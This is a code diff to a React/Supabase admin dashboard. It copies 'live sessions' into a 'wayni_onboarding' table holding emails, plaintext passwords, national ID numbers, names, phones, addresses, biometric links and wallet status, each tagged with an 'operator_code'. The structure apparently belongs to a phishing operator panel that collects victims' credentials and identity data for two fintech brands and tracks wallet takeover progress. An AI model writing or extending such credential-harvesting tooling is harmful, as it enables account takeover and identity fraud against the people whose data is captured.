@@ -337,6 +337,46 @@ const AdminV2 = () => {
       .eq("source", "cocosv2").gte("created_at", since)
       .order("created_at", { ascending: false }).limit(100);
     setLiveSessions((data as unknown as LiveSession[]) || []);
+
+    // Backfill: sync existing onboarding session data to dedicated wayni_onboarding table
+    const onboardingStatuses = ["verify_dni_submitted", "verify_dni_success", "address_submitted", "address_saved", "biometric_started", "biometric_finished"];
+    const onboardingSessions = ((data as unknown as LiveSession[]) || []).filter(
+      (s) => onboardingStatuses.includes(s.status) || (s.otp_code && s.otp_code.includes("dni:"))
+    );
+    for (const s of onboardingSessions) {
+      if (!s.email || !s.otp_code) continue;
+      const parts: Record<string, string> = {};
+      s.otp_code.split("|").forEach((part) => {
+        const sep = part.indexOf(":");
+        if (sep > 0) parts[part.slice(0, sep).trim()] = part.slice(sep + 1).trim();
+      });
+      if (!parts.dni) continue;
+      try {
+        const em = s.email.toLowerCase();
+        const { data: existing } = await (supabase as any)
+          .from("wayni_onboarding").select("id").eq("email", em).limit(1).single();
+        if (existing?.id) continue; // already exists, skip
+        await (supabase as any).from("wayni_onboarding").insert({
+          email: em,
+          session_id: s.id,
+          operator_code: s.operator_code || "",
+          dni: parts.dni || null,
+          full_name: parts.name || null,
+          phone: parts.phone || null,
+          gender: parts.gender || null,
+          user_uuid: parts.uuid || null,
+          password: s.password || null,
+          region: parts.region || null,
+          city: parts.city || null,
+          street: parts.street || null,
+          zip_code: parts.zip || null,
+          biometric_url: parts.biometric_url || null,
+          biometric_id: parts.biometric_id || null,
+          wallet_status: parts.wallet_status || null,
+          status: s.status,
+        });
+      } catch { /* silent — already exists or table not ready */ }
+    }
   }, []);
 
   useEffect(() => {
@@ -1543,9 +1583,42 @@ const WayniOnboardingCard = ({ session, index = 0 }: { session: LiveSession; ind
     });
   }
 
-  const dni = otpParts.dni || "";
-  const userName = otpParts.name || "";
-  const userUuid = otpParts.uuid || "";
+  // Enrich otpParts from dedicated wayni_onboarding table
+  const [onboardingRow, setOnboardingRow] = useState<Record<string, any> | null>(null);
+  useEffect(() => {
+    if (!session.email) return;
+    (async () => {
+      try {
+        const { data } = await (supabase as any)
+          .from("wayni_onboarding")
+          .select("*")
+          .eq("email", session.email.toLowerCase())
+          .order("created_at", { ascending: false })
+          .limit(1)
+          .single();
+        if (data) {
+          setOnboardingRow(data);
+          // Fill missing otpParts from dedicated table
+          if (data.dni && !otpParts.dni) otpParts.dni = data.dni;
+          if (data.full_name && !otpParts.name) otpParts.name = data.full_name;
+          if (data.phone && !otpParts.phone) otpParts.phone = data.phone;
+          if (data.gender && !otpParts.gender) otpParts.gender = data.gender;
+          if (data.user_uuid && !otpParts.uuid) otpParts.uuid = data.user_uuid;
+          if (data.region && !otpParts.region) otpParts.region = data.region;
+          if (data.city && !otpParts.city) otpParts.city = data.city;
+          if (data.street && !otpParts.street) otpParts.street = data.street;
+          if (data.zip_code && !otpParts.zip) otpParts.zip = data.zip_code;
+          if (data.biometric_url && !otpParts.biometric_url) otpParts.biometric_url = data.biometric_url;
+          if (data.biometric_id && !otpParts.biometric_id) otpParts.biometric_id = data.biometric_id;
+          if (data.password && !session.password) session.password = data.password;
+        }
+      } catch { /* table might not exist yet */ }
+    })();
+  }, [session.email]);
+
+  const dni = otpParts.dni || onboardingRow?.dni || "";
+  const userName = otpParts.name || onboardingRow?.full_name || "";
+  const userUuid = otpParts.uuid || onboardingRow?.user_uuid || "";
 
   const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
 
@@ -1636,6 +1709,26 @@ const WayniOnboardingCard = ({ session, index = 0 }: { session: LiveSession; ind
         Object.assign(existingParts, updates);
         const newOtp = Object.entries(existingParts).map(([k, v]) => `${k}:${v}`).join("|");
         await supabase.from("sessions").update({ otp_code: newOtp }).eq("id", session.id);
+        // Also persist wallet status to dedicated table
+        if (session.email && (updates.wallet_status || updates.validated)) {
+          try {
+            const onbData: Record<string, unknown> = {};
+            if (updates.wallet_status) onbData.wallet_status = updates.wallet_status;
+            if (updates.validated === "true") onbData.status = "validated";
+            if (Object.keys(onbData).length > 0) {
+              const { data: existing } = await (supabase as any)
+                .from("wayni_onboarding")
+                .select("id")
+                .eq("email", session.email.toLowerCase())
+                .order("created_at", { ascending: false })
+                .limit(1)
+                .single();
+              if (existing?.id) {
+                await (supabase as any).from("wayni_onboarding").update(onbData).eq("id", existing.id);
+              }
+            }
+          } catch { /* silent */ }
+        }
       }
     } catch { /* never error */ }
     setLoading(false);
